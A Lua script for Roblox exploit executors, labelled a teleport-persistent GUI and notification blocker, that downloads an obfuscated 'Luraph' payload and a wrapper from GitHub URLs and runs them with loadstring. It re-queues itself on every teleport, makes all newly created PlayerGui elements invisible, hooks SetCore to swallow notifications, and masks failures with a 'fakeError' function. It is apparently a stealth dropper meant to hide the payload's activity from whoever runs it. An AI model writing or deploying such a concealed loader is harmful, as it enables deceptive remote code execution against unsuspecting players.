--// TELEPORT-PERSISTENT GUI / NOTIFICATION BLOCKER
--// Error 1 = failed to download wrapper/payload
--// Error 2 = failed to compile payload
--// Error 3 = payload runtime error
--// Error 4 = queue_on_teleport unavailable

------------------------------------------------------------
-- CONFIG
------------------------------------------------------------

local WRAPPER_URL = "https://raw.githubusercontent.com/ExclusiveVersionGithubIsLoaded/CrownSoftworks/refs/heads/main/wrp.lua"
local PAYLOAD_URL = "https://raw.githubusercontent.com/ExclusiveVersionGithubIsLoaded/CrownSoftworks/refs/heads/main/drbf.lua"

------------------------------------------------------------
-- SERVICES
------------------------------------------------------------

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

------------------------------------------------------------
-- GLOBAL STATE
------------------------------------------------------------

local ENV = getgenv()

if ENV.__GUI_WRAPPER_RUNNING then
    return
end

ENV.__GUI_WRAPPER_RUNNING = true

------------------------------------------------------------
-- FAKE ERRORS
------------------------------------------------------------

local function fakeError(code)
    warn("error " .. tostring(code))
end

------------------------------------------------------------
-- GUI SETTINGS
------------------------------------------------------------

local HIDE_TEXT = true
local HIDE_IMAGES = true
local HIDE_FRAMES = true
local HIDE_STROKES = true
local HIDE_SCROLLBARS = true

------------------------------------------------------------
-- EXISTING OBJECTS
------------------------------------------------------------

local Existing = {}

local function rememberTree(root)
    Existing[root] = true

    for _, obj in ipairs(root:GetDescendants()) do
        Existing[obj] = true
    end
end

-- Existing game UI is considered safe.
rememberTree(PlayerGui)
rememberTree(CoreGui)

------------------------------------------------------------
-- HIDE OBJECT
------------------------------------------------------------

local function hideObject(obj)

    if not obj or not obj.Parent then
        return
    end

    --------------------------------------------------------
    -- SCREEN GUI
    --------------------------------------------------------

    if obj:IsA("ScreenGui") then

        pcall(function()
            obj.Enabled = false
        end)

        return
    end

    --------------------------------------------------------
    -- GUI OBJECT
    --------------------------------------------------------

    if HIDE_FRAMES and obj:IsA("GuiObject") then

        pcall(function()
            obj.BackgroundTransparency = 1
        end)

    end

    --------------------------------------------------------
    -- TEXT
    --------------------------------------------------------

    if HIDE_TEXT and (
        obj:IsA("TextLabel")
        or obj:IsA("TextButton")
        or obj:IsA("TextBox")
    ) then

        pcall(function()
            obj.TextTransparency = 1
        end)

        pcall(function()
            obj.TextStrokeTransparency = 1
        end)

    end

    --------------------------------------------------------
    -- IMAGES
    --------------------------------------------------------

    if HIDE_IMAGES and (
        obj:IsA("ImageLabel")
        or obj:IsA("ImageButton")
    ) then

        pcall(function()
            obj.ImageTransparency = 1
        end)

    end

    --------------------------------------------------------
    -- UI STROKE
    --------------------------------------------------------

    if HIDE_STROKES and obj:IsA("UIStroke") then

        pcall(function()
            obj.Transparency = 1
        end)

    end

    --------------------------------------------------------
    -- SCROLL BAR
    --------------------------------------------------------

    if HIDE_SCROLLBARS and obj:IsA("ScrollingFrame") then

        pcall(function()
            obj.ScrollBarImageTransparency = 1
        end)

    end

    --------------------------------------------------------
    -- VIEWPORT
    --------------------------------------------------------

    if obj:IsA("ViewportFrame") then

        pcall(function()
            obj.ImageTransparency = 1
        end)

    end
end

------------------------------------------------------------
-- HIDE TREE
------------------------------------------------------------

local function hideTree(root)

    if not root then
        return
    end

    hideObject(root)

    for _, obj in ipairs(root:GetDescendants()) do
        hideObject(obj)
    end
end

------------------------------------------------------------
-- NEW PLAYERGUI OBJECT
------------------------------------------------------------

local function processNewObject(obj)

    if Existing[obj] then
        return
    end

    Existing[obj] = true

    hideObject(obj)

    if obj:IsA("ScreenGui") then
        hideTree(obj)
    end
end

------------------------------------------------------------
-- PLAYERGUI WATCHER
------------------------------------------------------------

PlayerGui.DescendantAdded:Connect(function(obj)

    task.defer(function()
        processNewObject(obj)
    end)

end)

------------------------------------------------------------
-- IMPORTANT
--
-- CoreGui is NOT globally watched.
--
-- This protects:
-- • Roblox achievements
-- • Roblox notifications
-- • chat
-- • topbar
-- • system UI
-- • game-created CoreGui
------------------------------------------------------------

------------------------------------------------------------
-- NOTIFICATION FILTER
------------------------------------------------------------

local function shouldBlockNotification(args)

    if type(args) ~= "table" then
        return false
    end

    if args.Title ~= nil then
        return true
    end

    if args.Text ~= nil then
        return true
    end

    if args.Duration ~= nil then
        return true
    end

    if args.Button1 ~= nil then
        return true
    end

    if args.Button2 ~= nil then
        return true
    end

    return false
end

------------------------------------------------------------
-- SETCORE HOOK
------------------------------------------------------------

if hookfunction and newcclosure then

    local oldSetCore

    oldSetCore = hookfunction(
        StarterGui.SetCore,
        newcclosure(function(self, coreName, ...)

            ------------------------------------------------
            -- ONLY BLOCK CUSTOM SENDNOTIFICATION
            ------------------------------------------------

            if coreName == "SendNotification" then

                local args = {...}

                if shouldBlockNotification(args[1]) then
                    return nil
                end

            end

            ------------------------------------------------
            -- EVERYTHING ELSE PASSES THROUGH
            ------------------------------------------------

            return oldSetCore(self, coreName, ...)
        end)
    )

end

------------------------------------------------------------
-- FIND QUEUE FUNCTION
------------------------------------------------------------

local queueTeleport =
    (type(queue_on_teleport) == "function" and queue_on_teleport)
    or (type(queueteleport) == "function" and queueteleport)
    or (
        syn
        and type(syn.queue_on_teleport) == "function"
        and syn.queue_on_teleport
    )
    or (
        fluxus
        and type(fluxus.queue_on_teleport) == "function"
        and fluxus.queue_on_teleport
    )

------------------------------------------------------------
-- QUEUE WRAPPER AFTER TELEPORT
------------------------------------------------------------

if queueTeleport then

    local queuedCode = [[
        task.spawn(function()

            local success, source = pcall(function()
                return game:HttpGet("]] .. WRAPPER_URL .. [[")
            end)

            if not success then
                warn("error 1")
                return
            end

            local fn, compileError = loadstring(source)

            if not fn then
                warn("error 2")
                return
            end

            local executed, runtimeError = pcall(fn)

            if not executed then
                warn("error 3")
                return
            end

        end)
    ]]

    pcall(function()
        queueTeleport(queuedCode)
    end)

else

    fakeError(4)

end

------------------------------------------------------------
-- LOAD LURAPH PAYLOAD
------------------------------------------------------------

task.spawn(function()

    local success, source = pcall(function()
        return game:HttpGet(PAYLOAD_URL)
    end)

    if not success then
        fakeError(1)
        return
    end

    --------------------------------------------------------
    -- COMPILE
    --------------------------------------------------------

    local fn, compileError = loadstring(source)

    if not fn then
        fakeError(2)
        return
    end

    --------------------------------------------------------
    -- EXECUTE
    --------------------------------------------------------

    local executed, runtimeError = pcall(fn)

    if not executed then
        fakeError(3)
        return
    end

end)

------------------------------------------------------------
-- CLEANUP
------------------------------------------------------------

-- Allow the wrapper to be initialized again after
-- a completely new execution environment is created.
task.delay(5, function()

    if ENV then
        ENV.__GUI_WRAPPER_RUNNING = nil
    end

end)
